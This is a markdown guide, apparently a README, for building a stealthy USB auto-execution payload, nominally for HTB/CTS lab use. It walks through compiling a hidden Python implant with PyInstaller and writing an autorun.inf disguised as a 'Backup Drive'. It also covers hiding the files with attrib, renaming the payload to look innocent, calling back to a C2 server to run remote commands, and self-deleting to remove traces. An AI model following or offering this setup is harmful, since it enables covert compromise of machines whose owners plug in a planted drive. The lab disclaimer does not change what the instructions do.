# **USB Auto-Execution Payload - HTB/CTS Lab Guide**  
**For Authorized Penetration Testing Only**  

---

## **📌 Table of Contents**  
1. [What This Does](#-what-this-does)  
2. [Requirements](#-requirements)  
3. [USB File Checklist](#-usb-file-checklist)  
4. [Setup Guide](#-setup-guide)  
5. [Testing & C2 Commands](#-testing--c2-commands)  
6. [Safety & OPSEC](#⚠️-safety--opsec)  

---

## **🔍 What This Does**  
A stealthy USB payload for **HTB/CTS labs** that:  
✅ Auto-runs on insertion (via `autorun.inf` + `launch.bat`)  
✅ Calls back to your C2 server (HTB-provided IP)  
✅ Executes commands remotely  
✅ Self-hides (no windows/taskbar traces)  

---

## **📋 Requirements**  
### **🛠️ Tools**  
- **Windows PC** (for compiling/testing)  
- **USB Drive (FAT32 formatted)**  
- **Python 3.8+** + `pip install pyinstaller pycryptodomex pywin32`  

### **🔑 HTB/CTS Lab Info**  
- **C2 Server IP**: Provided in lab instructions (replace `YOUR_C2_IP` in `lab.py`)  
- **Target OS**: Windows (AutoRun may be disabled; manual execution might be needed)  

---

## **📂 USB File Checklist**  
Copy **these files to the USB root**:  
| File           | Purpose                                  | Hidden? |  
|----------------|------------------------------------------|---------|  
| `payload.exe`  | Compiled malware (from `lab.py`)         | Yes     |  
| `autorun.inf`  | Triggers `launch.bat` on USB insertion   | Yes     |  
| `launch.bat`   | Runs `payload.exe` silently              | Yes     |  
| `desktop.ini`  | Displays a fake "Documents" icon (optional) | Yes     |  

### **🚨 Critical Notes**  
- **Hide files**: Run in CMD (after copying):  
  ```cmd
  attrib +h +s payload.exe autorun.inf launch.bat desktop.ini
  ```  
- **Name `payload.exe` something innocent** (e.g., `setup.exe`) if AutoRun is blocked.  

---

## **🔧 Setup Guide**  

### **1️⃣ Generate RSA Keys**  
Run `generate_key.py` → Copy the **public key** into `lab.py`:  
```python
RSA_PUB_KEY = """-----BEGIN PUBLIC KEY-----
PASTE_YOUR_KEY_HERE
-----END PUBLIC KEY-----"""
```  

### **2️⃣ Compile `payload.exe`**  
```bash
pyinstaller --onefile --noconsole --clean lab.py -n payload
```  
➡️ Output: `dist/payload.exe` → Copy to USB.  

### **3️⃣ Configure `autorun.inf`**  
Ensure it matches:  
```ini
[AutoRun]
open=launch.bat
shellexecute=launch.bat
action=Open folder to view files
label=Backup Drive  ; Match HTB lab theme
icon=shell32.dll,4  ; Generic folder icon
```  

---

## **🚀 Testing & C2 Commands**  

### **🔌 Execution Methods**  
1. **AutoRun (If enabled in lab)**:  
   - Plug USB → `autorun.inf` → `launch.bat` → `payload.exe`.  
2. **Manual (If AutoRun fails)**:  
   - Double-click `launch.bat` or `payload.exe`.  

### **📡 C2 Server Commands**  
Send these from your C2 (HTB lab server):  
| Command          | Action                          |  
|------------------|---------------------------------|  
| `exec whoami`    | Runs `whoami` on target         |  
| `cleanup`        | Self-destructs + removes traces |  

---

## **⚠️ Safety & OPSEC**  
1. **Lab Restrictions**:  
   - HTB may block AutoRun → Use manual execution.  
   - Firewalls may block C2 → Check lab instructions.  
2. **Cleanup**:  
   - `payload.exe` auto-removes traces on `cleanup`.  
   - Format USB after testing.  

---

## **❓ Troubleshooting**  
| Issue                  | Fix                                  |  
|------------------------|--------------------------------------|  
| `payload.exe` crashes  | Recompile with `--debug` flag        |  
| No C2 connection       | Check `C2_SERVER` IP in `lab.py`     |  
| AutoRun fails          | Manually run `launch.bat`            |  

---

## **📜 Final Notes**  
- **Test in a VM first** (e.g., VirtualBox with AutoRun enabled).  
- **HTB/CTS may require adjustments** (ask instructors if stuck).  
- **Never use outside authorized labs!**  

🔐 **Good luck with the challenge!**  
